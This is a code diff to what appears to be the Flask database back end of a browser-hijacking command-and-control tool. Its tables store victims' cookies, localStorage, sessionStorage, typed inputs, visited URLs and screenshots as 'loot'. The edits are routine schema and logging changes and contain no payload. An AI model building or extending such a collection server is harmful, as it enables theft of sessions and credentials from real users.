@@ -11,6 +11,7 @@ import time
 import threading
 
 
+# Initialization stuff
 app = Flask(__name__)
 CORS(app)
 baseDir = os.path.abspath(os.path.dirname(__file__))
@@ -18,6 +19,8 @@ app.config["SQLALCHEMY_DATABASE_URI"] = 'sqlite:///' + os.path.join(baseDir, 'js
 app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
 db = SQLAlchemy(app)
 
+
+# *********************************************************************
 
 def printHeader():
     print("""
@@ -71,8 +74,8 @@ logFileName = "sessionLog.txt"
 #***************************************************************************
 # Database classes
 class Client(db.Model):
-    id        = db.Column(db.String(100), primary_key=True)
-    nickname  = db.Column(db.String(100), unique=True, nullable=True)
+    id        = db.Column(db.Integer, primary_key=True)
+    nickname  = db.Column(db.String(100), unique=True, nullable=False)
     notes     = db.Column(db.Text)
     firstSeen = db.Column(db.DateTime(timezone=True),server_default=func.now())
     lastSeen  = db.Column(db.DateTime(timezone=True), onupdate=func.now())
@@ -81,22 +84,20 @@ class Client(db.Model):
         return f'<Client {self.id}>'
 
 
-# Not finished
+# Keep screenshots as files on disk, just track the filename
 class Screenshot(db.Model):
-    id        = db.Column(db.String(100), primary_key=True)
+    id        = db.Column(db.Integer, primary_key=True)
     clientID  = db.Column(db.String(100), nullable=False)
     url       = db.Column(db.String(100), nullable=False)
     timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
-    # Not sure how to handle images yet
-    # https://sqlalchemy-imageattach.readthedocs.io/en/1.0.0/
-    # https://stackoverflow.com/questions/34154660/correct-way-to-declare-an-image-field-sqlalchemy
-
+    fileName  = db.Column(db.String(100), nullable=False)
+  
     def __repr__(self):
         return f'<Client {self.id}>'
 
 
 class HtmlCode(db.Model):
-    id        = db.Column(db.String(100), primary_key=True)
+    id        = db.Column(db.Integer, primary_key=True)
     clientID  = db.Column(db.String(100), nullable=False)
     url       = db.Column(db.String(100), nullable=False)
     timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
@@ -107,7 +108,7 @@ class HtmlCode(db.Model):
 
 
 class UrlVisited(db.Model):
-    id        = db.Column(db.String(100), primary_key=True)
+    id        = db.Column(db.Integer, primary_key=True)
     clientID  = db.Column(db.String(100), nullable=False)
     url       = db.Column(db.String(100), nullable=False)
     timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
@@ -117,7 +118,7 @@ class UrlVisited(db.Model):
 
 
 class UserInput(db.Model):
-    id         = db.Column(db.String(100), primary_key=True)
+    id         = db.Column(db.Integer, primary_key=True)
     clientID   = db.Column(db.String(100), nullable=False)
     inputName  = db.Column(db.String(100), nullable=False)
     inputValue = db.Column(db.String(100), nullable=False)
@@ -128,7 +129,7 @@ class UserInput(db.Model):
 
 
 class Cookie(db.Model):
-    id          = db.Column(db.String(100), primary_key=True)
+    id          = db.Column(db.Integer, primary_key=True)
     clientID    = db.Column(db.String(100), nullable=False)
     cookieName  = db.Column(db.String(100), nullable=False)
     cookieValue = db.Column(db.String(100), nullable=False)
@@ -139,7 +140,7 @@ class Cookie(db.Model):
 
 
 class LocalStorage(db.Model):
-    id        = db.Column(db.String(100), primary_key=True)
+    id        = db.Column(db.Integer, primary_key=True)
     clientID  = db.Column(db.String(100), nullable=False)
     key       = db.Column(db.String(100), nullable=False)
     value     = db.Column(db.String(100), nullable=False)
@@ -150,7 +151,7 @@ class LocalStorage(db.Model):
 
 
 class SessionStorage(db.Model):
-    id        = db.Column(db.String(100), primary_key=True)
+    id        = db.Column(db.Integer, primary_key=True)
     clientID  = db.Column(db.String(100), nullable=False)
     key       = db.Column(db.String(100), nullable=False)
     value     = db.Column(db.String(100), nullable=False)
@@ -158,6 +159,10 @@ class SessionStorage(db.Model):
 
     def __repr__(self):
         return f'<Client {self.id}>'
+
+
+# User C2 UI session?
+
 
 #***************************************************************************
 # Support Functions
@@ -194,7 +199,7 @@ def findLootDirectory(identifier):
         print("New session for client: " + identifier)
 
         # Database Entry
-        newClient = Client(id=identifier)
+        newClient = Client(nickname=identifier, notes='testNote')
         db.session.add(newClient)
         db.session.commit()
 
@@ -417,11 +422,11 @@ if __name__ == '__main__':
             numClients = len(clients)
 
             if numClients==0:
-                print("No clients found in database, rebuilding")
+                print("----No clients found in database, rebuilding")
                 db.drop_all()
                 db.create_all()
             else:
-                print("Existing database has " + str(numClients) + " clients.")
+                print("----Existing database has " + str(numClients) + " clients.")
                 print("Make selection:")
                 print("1 - Continue using existing database")
                 print("2 - Delete database and start fresh")
